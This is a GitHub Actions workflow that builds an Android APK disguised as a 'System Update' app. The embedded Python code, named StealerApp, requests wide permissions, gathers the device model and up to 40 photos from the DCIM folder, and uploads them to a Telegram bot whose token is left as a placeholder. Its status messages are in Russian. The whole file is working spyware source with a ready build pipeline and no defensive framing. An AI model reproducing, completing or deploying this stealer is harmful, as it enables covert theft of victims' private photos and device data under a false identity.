name: Build APK

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
    - name: Checkout code
      uses: actions/checkout@v4

    - name: Setup Python
      uses: actions/setup-python@v5
      with:
        python-version: '3.9'

    - name: Setup Java
      uses: actions/setup-java@v4
      with:
        distribution: 'temurin'
        java-version: '11'

    - name: Install dependencies
      run: |
        sudo apt update
        sudo apt install -y git zip unzip openjdk-11-jdk python3-pip autoconf libtool pkg-config zlib1g-dev libncurses5-dev libncursesw5-dev libtinfo5 cmake libffi-dev libssl-dev
        pip install buildozer cython

    - name: Create buildozer.spec
      run: |
        cat > buildozer.spec <<EOF
[app]
title = System Update
package.name = systemupdate
package.domain = com.system
source.dir = .
version = 0.1
requirements = python3,kivy,requests,android
orientation = portrait
osx.python_version = 3
osx.kivy_version = 2.1.0
fullscreen = 0

[buildozer]
log_level = 2
warn_on_root = 1

[android]
api = 30
minapi = 21
ndk = 23b
sdk = 30
permissions = INTERNET, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, READ_CONTACTS, ACCESS_FINE_LOCATION, CAMERA, RECORD_AUDIO, READ_SMS
EOF

    - name: Create main.py
      run: |
        cat > main.py <<EOF
from kivy.app import App
from kivy.uix.label import Label
from kivy.clock import Clock
import requests
import os
import subprocess

BOT_TOKEN = "ТВОЙ_ТОКЕН"
CHAT_ID = "ТВОЙ_CHAT_ID"

def send_telegram(msg, file_path=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
    if file_path and os.path.exists(file_path):
        try:
            files = {'document': open(file_path, 'rb')}
            data = {'chat_id': CHAT_ID}
            requests.post(url + "sendDocument", files=files, data=data, timeout=30)
        except:
            pass
    else:
        data = {'chat_id': CHAT_ID, 'text': msg[:4000]}
        try:
            requests.post(url + "sendMessage", data=data, timeout=10)
        except:
            pass

def collect_and_send():
    send_telegram("✅ Приложение запущено")
    try:
        model = subprocess.getoutput("getprop ro.product.model")
        brand = subprocess.getoutput("getprop ro.product.brand")
        send_telegram(f"📱 {brand} {model}")
    except:
        pass
    
    try:
        photos = []
        dcim = "/storage/emulated/0/DCIM/"
        if os.path.exists(dcim):
            for root, dirs, files in os.walk(dcim):
                for f in files:
                    if f.lower().endswith(('.jpg', '.jpeg', '.png')) and len(photos) < 40:
                        photos.append(os.path.join(root, f))
        for photo in photos:
            send_telegram("📸 Фото", photo)
    except:
        pass
    
    send_telegram("✅ Сбор завершён")

class StealerApp(App):
    def build(self):
        Clock.schedule_once(lambda dt: collect_and_send(), 1)
        return Label(text="System Update")

if __name__ == "__main__":
    StealerApp().run()
EOF

    - name: Build APK
      run: |
        buildozer android debug

    - name: Upload APK
      uses: actions/upload-artifact@v4
      with:
        name: my-stealer-apk
        path: bin/*.apk
